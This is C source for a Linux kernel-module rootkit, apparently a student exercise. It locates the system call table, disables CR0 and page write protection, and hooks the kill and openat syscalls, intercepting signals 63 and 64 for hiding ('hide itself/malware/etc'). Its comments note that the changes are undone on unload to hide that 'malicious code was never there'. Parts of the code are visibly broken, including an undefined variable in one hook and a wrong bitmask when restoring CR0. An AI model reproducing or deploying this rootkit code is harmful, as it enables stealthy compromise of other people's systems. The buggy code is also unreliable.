#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>    // Contains function e.g. kallsyms_lookup_name
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/paravirt.h>

#include <linux/unistd.h>        // for system call constants
#include <linux/version.h>
#include <linux/dirent.h>      // Contains dirent structs etc

/* Module Information*/
//MODULE_LICENSE("GPL");
MODULE_AUTHOR("jerry");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");

//This is a pointer to the system call table
static unsigned long * sys_call_table;

#ifdef CONFIG_X86_64
  #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    #define PTREGS_SYSCALL_STUB 1
    typedef asmlinkage long (* ptregs_t)(const struct pt_regs * regs);
    static ptregs_t orig_kill;
  #else 
    typedef asmlinkage long(* orig_kill_t)(pid_t pid, int sig);
    static orig_kill_t orig_kill;
  #endif
#endif

enum signals{
  SIGSUPER = 64,
  SIGINVIS = 63,
};

#if PTREGS_SYSCALL_STUB 
  static asmlinkage long hack_kill(const struct pt_regs *regs){
    int sig = regs ->si;
    if(sig == SIGSUPER) {
      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
      return 0;
    } else if(sig == SIGINVIS){
      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
      return 0;
    }
    return orig_kill(regs);
  }
#else

static asmlinkage long hack_kill(pid_t pid, int sig){
  int sig = regs ->si;
    if(sig == SIGSUPER) {
      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
      return 0;
    } else if(sig == SIGINVIS){
      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
      return 0;
    }
    return orig_kill(regs);
}

#endif

static int cleanup(void){
  /* kill */
  sys_call_table[__NR_kill] = (unsigned long)orig_kill;
  return  0;
  }

static int store(void){
  #if PTREGS_SYSCALL_STUB
  /* kill */
  orig_kill = (ptregs_t) sys_call_table[__NR_kill];
  printk(KERN_INFO "orig_kill table entry successfully stored \n");
  #else
  /* kill */
  orig_kill = (orig_kill_t) sys_call_table[__NR_kill];
  printk(KERN_INFO "orig_kill table entry successfully stored \n");

  #endif
    return 0;
}

static int hook(void){
  printk(KERN_INFO "hooked function");
  /* kill */
  sys_call_table[__NR_kill] = (unsigned long)&hack_kill;


  return 0;
}

static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static void unprotect_memory(void){
  write_cr0_forced(read_cr0() & (~ 0x10000));
  printk(KERN_INFO "unprotected memory\n");
}

static void protect_memory(void){
  write_cr0_forced(read_cr0() | (~ 0x10000));
  printk(KERN_INFO "protected memory\n");
}

/////////////////////////////////////////////////////
#define PREFIX "sneaky_process"



// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  return (*original_openat)(regs);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  int err = 1;
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  #else 
    sys_call_table = NULL;
  #endif

  if(! sys_call_table){
    printk(KERN_INFO "error: sys_call_table == null");
    return err;
  }

  if(store() == err){
    printk(KERN_INFO "error: store error \n");
  }

  unprotect_memory();
  if(hook() == err){
    printk(KERN_INFO "error: hook error\n");
  }
  protect_memory();
  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{ int err = 1;
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
  unprotect_memory();
  if(cleanup() == err){
    printk(KERN_INFO "error: cleanup error\n");
  }
  protect_memory();

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");